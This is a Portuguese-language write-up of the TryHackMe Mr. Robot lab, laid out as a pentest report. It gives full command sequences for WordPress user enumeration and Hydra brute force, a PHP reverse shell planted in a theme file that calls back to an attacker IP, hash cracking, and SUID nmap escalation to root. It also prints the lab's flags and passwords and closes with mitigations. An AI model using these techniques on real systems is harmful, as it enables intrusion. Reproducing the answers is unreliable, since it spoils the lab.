<!-- ================================================= -->
<!--        Mr. Robot – Technical Pentest Report       -->
<!-- ================================================= -->

<p align="center">
  <img src="https://img.shields.io/badge/Category-Web%20Pentest-red?style=for-the-badge">
  <img src="https://img.shields.io/badge/Focus-Offensive%20Security-black?style=for-the-badge">
  <img src="https://img.shields.io/badge/Methodology-PTES-blue?style=for-the-badge">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Environment-TryHackMe-informational?style=flat-square">
  <img src="https://img.shields.io/badge/Target-Linux%20%2B%20WordPress-orange?style=flat-square">
  <img src="https://img.shields.io/badge/Level-Intermediate--Advanced-yellow?style=flat-square">
</p>

---

# 🧪 Relatório Técnico de Teste de Penetração  
## Laboratório Mr. Robot — TryHackMe

Este documento apresenta um **relatório técnico completo de teste de penetração** realizado no laboratório **Mr. Robot**, disponibilizado pela plataforma **TryHackMe**.  
O objetivo é demonstrar, de forma **estruturada, reproduzível e profissional**, todo o ciclo de um ataque ofensivo realista, desde o **reconhecimento inicial** até a **obtenção de acesso root**, incluindo **análises de impacto e recomendações de mitigação**.

O laboratório simula um **ambiente vulnerável baseado em WordPress e Linux**, inspirado na série *Mr. Robot*, e foi explorado utilizando **ferramentas amplamente empregadas em cenários reais de pentest**, como **Nmap, Gobuster, Hydra, John the Ripper, Hashcat e GTFOBins**.

---

## 🎯 Objetivo do Relatório

- Documentar **todas as etapas do ataque** de forma técnica e didática
- Demonstrar **raciocínio ofensivo**, não apenas execução de comandos
- Correlacionar **vulnerabilidades → exploração → impacto**
- Evidenciar **boas práticas de documentação em cibersegurança**
- Apresentar **medidas de hardening e mitigação** aplicáveis ao mundo real

---

## 🧠 Abordagem Metodológica

A análise segue o padrão **PTES (Penetration Testing Execution Standard)**, garantindo uma abordagem profissional e alinhada ao mercado:

1. Reconhecimento e Enumeração  
2. Análise de Vulnerabilidades  
3. Exploração  
4. Pós-Exploração  
5. Documentação e Mitigações  

Cada fase contém:
- Ferramentas utilizadas
- Comandos executados
- Análise técnica dos resultados
- Impacto de segurança

---

## ⚙️ Escopo do Laboratório

- **Tipo de alvo:** Aplicação Web + Sistema Linux
- **Tecnologias:** Apache · WordPress · SSH
- **Vetores explorados:**  
  - Information Disclosure  
  - Enumeração de usuários  
  - Força bruta de credenciais  
  - Execução remota de código  
  - Quebra de hash  
  - Escalonamento de privilégios (SUID)

---

## ⚠️ Aviso Legal

> Todo o conteúdo apresentado neste documento tem **finalidade exclusivamente educacional** e foi executado em um **ambiente controlado**, com autorização explícita da plataforma TryHackMe.  
> A reprodução dessas técnicas fora de ambientes autorizados é **ilegal** e passível de sanções legais.

---

# Documentação Técnica do Laboratório [Mr. Robot](https://tryhackme.com/room/mrrobot)

## Introdução

O laboratório **Mr. Robot** da TryHackMe é um desafio de segurança cibernética baseado na série de TV homônima, projetado para testar habilidades práticas em testes de penetração web. Este ambiente simulado apresenta múltiplas vulnerabilidades do mundo real que devem ser exploradas sequencialmente para obter acesso completo ao sistema.

**Objetivos do Laboratório:**

1. Encontrar e explorar vulnerabilidades web
2. Realizar brute force attacks
3. Escalar privilégios através de múltiplos vetores
4. Obter as três flags (keys) escondidas no sistema

**Metodologia Aplicada:** PTES (Penetration Testing Execution Standard)

- Reconhecimento
- Análise de Vulnerabilidades
- Exploração
- Pós-Exploração
- Documentação

---
# Enumeração e Reconhecimento

## 1. Mapeamento Inicial da Rede

```bash
nmap -sC -sV <alvo> -oN nmap_initial.txt
```

**Parâmetros utilizados:**

- `-sC`: Executa scripts padrão do Nmap para enumeração adicional
- `-sV`: Detecção de versões de serviços
- `<alvo>`: Endereço IP do sistema alvo
- `-oN nmap_initial.txt`: Salva saída em arquivo para documentação

**Resultado:**

```text
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 53:93:57:d6:e1:97:fb:df:32:35:0a:01:c2:fb:c5:9b (RSA)
|   256 54:da:41:63:55:28:42:1f:f5:b1:b1:8c:ee:eb:65:ed (ECDSA)
|_  256 9b:54:26:65:33:28:97:08:c1:ba:87:cc:5d:76:3e:4f (ED25519)
80/tcp  open  http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Análise dos resultados:**

|Porta|Serviço|Versão|Observações de Segurança|
|---|---|---|---|
|22|SSH|OpenSSH 8.2p1|Versão atualizada, pode ter proteções|
|80|HTTP|Apache|Servidor web principal|
|443|HTTPS|Apache|Certificado SSL inválido/generic|

**Vulnerabilidades preliminares identificadas:**

- Certificado SSL autoassinado/inválido
- Exposição de versões específicas de serviços

## 2. Análise da Aplicação Web (Porta 80)

### 2.1 Enumeração de Conteúdo Via Robots.txt

**Acesso ao arquivo robots.txt:**

```bash
curl http://<alvo>/robots.txt
```

**Conteúdo encontrado:**

```text
User-agent: *
fsocity.dic
key-1-of-3.txt
```

**Análise:**

- `robots.txt` descoberto e acessível
- Lista dois arquivos potencialmente sensíveis
- Técnica de information disclosure

### 2.2 Coleta da Primeira Flag

```bash
# Acessar arquivo exposto
curl http://<alvo>/key-1-of-3.txt
```

**Primeira flag obtida:**

```text
073403c8a58a1f80d943455fb30724b9
```

### 2.3 Análise do Dicionário Exposto

**Download do arquivo:**

```bash
wget http://<alvo>/fsocity.dic
```

**Estatísticas do dicionário:**

```bash
wc -l fsocity.dic
# Número de linhas/palavras

head -20 fsocity.dic
# Visualizar amostra do conteúdo
```

**Valor para ataques:**

- Dicionário personalizado para o ambiente
- Pode conter palavras-chave específicas da aplicação
- Útil para ataques de força bruta

## 3. Enumeração de Diretórios

```bash
gobuster dir -u http://<alvo> -w /usr/share/wordlists/dirb/common.txt -o gobuster_scan.txt
```

**Parâmetros:**

- `dir`: Modo de enumeração de diretórios
- `-u`: URL alvo
- `-w`: Wordlist contendo nomes comuns de diretórios    
- `-o`: Salva resultados em arquivo


**Resultados relevantes identificados:**

|Diretório|Status|Tamanho|Observações|
|---|---|---|---|
|`/wp-login`|200|2664|Página de login WordPress|
|`/wp-admin`|301|237|Redireciona para área administrativa|
|`/admin`|301|234|Pode ser ponto de entrada alternativo|
|`/phpmyadmin`|403|94|Acesso proibido, mas presente|
|`/robots.txt`|200|41|Já explorado anteriormente|

**Análise de segurança:**

- Sistema WordPress identificado (`/wp-admin`, `/wp-login`)
- Possível instalação do phpMyAdmin (acesso restrito)
- Múltiplos endpoints expostos

---
# Exploração e Acesso Inicial em `/wp-login`

![Login Page](assets/Pasted%20image%2020260203185525.png)

## 4. Identificação de Usuários WordPress

### 4.1 Análise de Mensagens de Erro

**Comportamento observado:**

1. **Usuário inválido**: `**ERROR**: Invalid username.`

![Invalid username](assets/Pasted%20image%2020260203185758.png)

2. **Senha incorreta** (mensagem encontrada após enumeração de usuários): `**ERROR**: The password you entered for the username **elliot** is incorrect.`

![Invalid password](assets/Pasted%20image%2020260203190256.png)

**Valor para ataques:**

- Vazamento de informação sobre validade de usuários
- Permite enumerar usuários válidos
- Diferença nas mensagens permite distinguir casos

### 4.2 Ataque de Enumeração de Usuários com Hydra

```bash
hydra -L fsocity.txt -p test <alvo> http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username." \
  -t 50 -f -o hydra_user_enum.txt
```

**Explicação dos parâmetros:**

- `-L fsocity.txt`: Lista de usuários para testar
- `-p test`: Senha fixa para teste
- `http-post-form`: Método de autenticação
- `F=Invalid username.`: Filtro para falhas (usuário inválido)
- `-t 50`: Número de threads paralelas
- `-f`: Parar na primeira descoberta    
- `-o`: Salvar resultados em arquivo

**Resultado:**

```text
[80][http-post-form] host: 10.67.150.25   login: Elliot   password: test
```

**Usuário identificado:** `Elliot` (nota: WordPress é case-sensitive)

## 5. Ataque de Força Bruta na Senha

```bash
hydra -l Elliot -P fsocity.txt <alvo> http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username." \
  -t 50 -f -o hydra_password_crack.txt
```

**Credenciais descobertas:**

- **Usuário:** `Elliot`
- **Senha:** `ER28-0652`

**Análise da senha:**

- Padrão alfanumérico
- Possível referência à série Mr. Robot
- Senha relativamente fraca

## 6. Acesso ao Painel WordPress

### 6.1 Validação de Acesso

Após login bem-sucedido, temos acesso ao dashboard.

![Dashboard](assets/Pasted%20image%2020260203190626.png)

**Privilégios obtidos:**

- Edição de temas
- Upload de arquivos
- Potencial execução de código PHP
- Acesso à estrutura do site    

### 6.2 Exploração do Editor de Temas

**Caminho:**

```text
Appearance → Editor → Archive.php (TwentyFifteen)
```

![Editor de Temas](assets/Pasted%20image%2020260203190911.png)

**Vulnerabilidade explorada:**

- Permissões inadequadas de edição
- Capacidade de modificar arquivos PHP do tema
- Execução de código arbitrário no contexto do servidor web

## 7. Upload de Web Shell via Editor de Temas

### 7.1 Preparação do Reverse Shell PHP

**Localização do template:**

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
```

**Modificações necessárias:**

```php
$ip = '10.67.150.100';  // IP DO ATACANTE
$port = 4444;           // PORTA DE ESCUTA
```

![Reverse Shell](assets/Pasted%20image%2020260203191219.png)

Depois é só clicar em `Update File` para enviar o arquivo malicioso.
### 7.2 Configuração do Listener

```bash
nc -lvnp 4444
```

**Parâmetros:**

- `-l`: Modo listener (escuta por conexões)
- `-v`: Verbose (mostra informações detalhadas)
- `-n`: Não resolve DNS (apenas endereços IP)
- `-p 4444`: Porta de escuta

### 7.3 Execução do Shell Reverso

**Acesso ao arquivo modificado:**

```text
http://<alvo>/wp-content/themes/twentyfifteen/archive.php
```

**Mecanismo de funcionamento:**

1. Arquivo PHP é executado pelo servidor web
2. Estabelece conexão reversa com o atacante
3. Fornece shell com privilégios do usuário web (www-data)

## 8. Estabilização do Shell

### 8.1 Verificação do Ambiente

```bash
# Verificar usuário atual
whoami
# www-data

# Verificar versão do Python
python --version
# Python 2.7.18

# Verificar outros interpretadores disponíveis
which python3
which perl
which bash
```

```bash
# Spawnar shell Python com suporte a pty
python -c 'import pty; pty.spawn("/bin/bash")'

# Configurar terminal adequadamente (após Ctrl+Z no lado do atacante)
stty raw -echo; fg

# Configurar variáveis de ambiente
export TERM=xterm
export SHELL=/bin/bash
stty rows 50 columns 132
```

---
# Movimento Lateral e Escalonamento

## 9. Enumeração do Sistema de Arquivos

### 9.1 Exploração do Diretório /home

```bash
cd /home
ls -la
```

**Resultado:**

```
drwxr-xr-x  2 root   root   4096 Nov 13  2015 robot
drwxr-xr-x  4 ubuntu ubuntu 4096 Jun  2  2025 ubuntu
```

### 9.2 Análise do Diretório do Usuário Robot

```bash
cd /home/robot
ls -la
```

**Conteúdo identificado:**

```text
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

**Análise de permissões:**

- `key-2-of-3.txt`: Apenas usuário `robot` pode ler
- `password.raw-md5`: Leitura permitida para todos

### 9.3 Extração do Hash de Senha

```bash
cat password.raw-md5
```

**Conteúdo:**

```text
robot:c3fcd3d76192e4007dfb496cca67e13b
```

**Formato:** `usuário:hash_md5`

- Hash MD5: `c3fcd3d76192e4007dfb496cca67e13b`
- Possível senha em texto claro convertida para MD5    

## 10. Quebra do Hash MD5

### 10.1 Preparação do Hash

```bash
# Extrair apenas a parte do hash
echo "c3fcd3d76192e4007dfb496cca67e13b" > hash.txt
```

### 10.2 Ataque com John the Ripper

```bash
john --wordlist=fsocity.txt --format=raw-md5 hash.txt
```

**Observação sobre formatação:**  
O hash MD5 não requer formatação especial no John, mas em alguns casos pode ser necessário especificar o formato exato. O problema de maiúsculas pode ser devido a:

1. Wordlist em maiúsculas
2. Configuração do sistema
3. Versão específica do John

**Solução alternativa (hashcat):**

```bash
echo "c3fcd3d76192e4007dfb496cca67e13b" > robot.hash
hashcat -m 0 robot.hash fsocity.txt --force
```

### 10.3 Resultado da Quebra

**Senha descoberta:** `abcdefghijklmnopqrstuvwxyz`

**Análise:**

- Senha extremamente fraca (sequência alfabética)
- Falta de complexidade
- Vulnerabilidade de configuração

## 11. Acesso ao Usuário Robot

```bash
su robot
```

**Quando solicitada a senha:** `abcdefghijklmnopqrstuvwxyz`

**Verificação de acesso:**

```bash
whoami
# robot

id
# uid=1002(robot) gid=1002(robot) groups=1002(robot)
```

## 12. Coleta da Segunda Flag

```bash
cat /home/robot/key-2-of-3.txt
```

**Segunda flag:**

```text
822c73956184f694993bede3eb39f959
```

---
# Escalonamento Final para Root

## 13. Enumeração de Vetores de Escalonamento

### 13.1 Busca por Binários SUID

```bash
find / -perm /6000 -type f 2>/dev/null
```

**Explicação do comando:**

- `/`: Diretório raiz para busca
- `-perm /6000`: Busca por permissões SUID (4000) ou SGID (2000)
- `-type f`: Apenas arquivos regulares
- `2>/dev/null`: Redireciona erros para /dev/null (silencioso)

**Resultados significativos:**

```text
/usr/local/bin/nmap
```

**Análise de segurança:**

- Nmap instalado com bit SUID ativo
- Binário em `/usr/local/bin/` (não padrão)
- Permite execução como proprietário (provavelmente root)    

### 13.2 O que são Binários SUID?

**SUID (Set User ID):**

- Permissão especial em sistemas Unix/Linux
- Quando executado, roda com privilégios do proprietário, não do executante
- Representado por `s` no campo de permissões do dono
- Exemplo comum: `/usr/bin/passwd`

**Risco de segurança:**

- Binários SUID mal configurados permitem escalação de privilégios
- Se nmap tem SUID, executa como root
- Pode ser usado para obter shell root

## 14. Exploração do Nmap com SUID

### 14.1 Uso do [GTFOBins](https://gtfobins.org/)

**GTFOBins** é uma lista curada de binários Unix que podem ser usados para bypass de restrições de segurança, incluindo escalação de privilégios.

**Comando identificado para nmap:**

```bash
/usr/local/bin/nmap --interactive
```

### 14.2 Execução do Nmap em Modo Interativo

```bash
/usr/local/bin/nmap --interactive
```

**Saída esperada:**


```text
Starting Nmap V. 7.80 ( https://nmap.org )
Welcome to Interactive Mode -- press h <enter> for help
nmap> 
```

### 14.3 Escape para Shell via Nmap

**Dentro do prompt interativo do nmap:**

```text
nmap> !sh
```

**Mecanismo:**

- O comando `!sh` executa shell do sistema
- Como nmap roda com SUID root, o shell também roda como root
- Resulta em shell root interativo

**Verificação de privilégios:**

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)
```

## 15. Coleta da Flag Final

### 15.1 Navegação ao Diretório Root

```bash
cd /root
ls -la
```

**Conteúdo:**

```text
-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
```

### 15.2 Leitura da Terceira Flag

```bash
cat /root/key-3-of-3.txt
```

**Terceira flag:**

```text
04787ddef27c3dee1ee161b21670b4e4
```

---
# Análise de Segurança e Mitigações

## Vulnerabilidades Identificadas

### 1. Information Disclosure (Robots.txt)

- **Severidade:** Média
- **Impacto:** Exposição de arquivos sensíveis
- **Mitigação:** Restringir acesso a robots.txt ou remover referências a arquivos sensíveis

### 2. Enumeração de Usuários WordPress

- **Severidade:** Alta
- **Impacto:** Permite identificar usuários válidos
- **Mitigação:** Usar mensagens de erro genéricas

### 3. Força Bruta em Autenticação

- **Severidade:** Crítica
- **Impacto:** Comprometimento de credenciais
- **Mitigação:** Implementar rate limiting, CAPTCHA, autenticação em duas etapas

### 4. Upload/Execução de Código Arbitrário

- **Severidade:** Crítica    
- **Impacto:** Execução remota de código
- **Mitigação:** Restringir permissões de edição de temas, validação de entrada

### 5. Armazenamento de Senhas em MD5

- **Severidade:** Alta
- **Impacto:** Quebra fácil de hashes
- **Mitigação:** Usar algoritmos modernos (bcrypt, Argon2), salts

### 6. Binários SUID Mal Configurados

- **Severidade:** Crítica
- **Impacto:** Escalação de privilégios para root
- **Mitigação:** Revisar e remover bits SUID desnecessários

## Recomendações de Hardening

### Para WordPress:

```php
// Configurar mensagens de erro genéricas
define('WP_DEBUG', false);
define('WP_DEBUG_DISPLAY', false);

// Implementar rate limiting
// Usar plugins de segurança como Wordfence
```

### Para Sistema Linux:

```bash
# Remover bit SUID do nmap
chmod u-s /usr/local/bin/nmap

# Implementar auditoria de binários SUID
find / -perm /4000 -type f -exec ls -la {} \; 2>/dev/null

# Configurar limites de login
sudo vi /etc/security/limits.conf
```

### Para Configurações de Serviços:

```bash
# Restringir acesso a diretórios sensíveis
chmod 700 /home/robot
chmod 600 /home/robot/*

# Implementar monitoramento
sudo apt install auditd
auditctl -w /usr/local/bin/nmap -p x -k suid_binaries
```

## Lições Aprendidas

1. **Defesa em Profundidade:** Múltiplas falhas foram necessárias para comprometimento total
2. **Minimização de Superfície de Ataque:** Expor apenas o necessário
3. **Monitoramento Contínuo:** Detectar atividades anormais precocemente
4. **Princípio do Menor Privilégio:** Usar permissões mínimas necessárias
5. **Validação Rigorosa:** Validar todas as entradas do usuário

## Conclusão

O laboratório Mr. Robot demonstrou de forma prática como vulnerabilidades comuns podem ser exploradas sequencialmente para comprometer completamente um sistema. A jornada desde a enumeração inicial até a obtenção de acesso root ilustra a importância de uma abordagem metódica e abrangente para testes de penetração.

**Fluxo completo de ataque:**

1. Reconhecimento → Enumeração de diretórios
2. Information disclosure → Dicionário exposto
3. Enumeração de usuários → Identificação de credenciais válidas
4. Força bruta → Comprometimento de conta WordPress
5. Upload de web shell → Acesso inicial ao sistema
6. Movimento lateral → Quebra de hash, acesso a outro usuário
7. Escalonamento final → Exploração de binário SUID
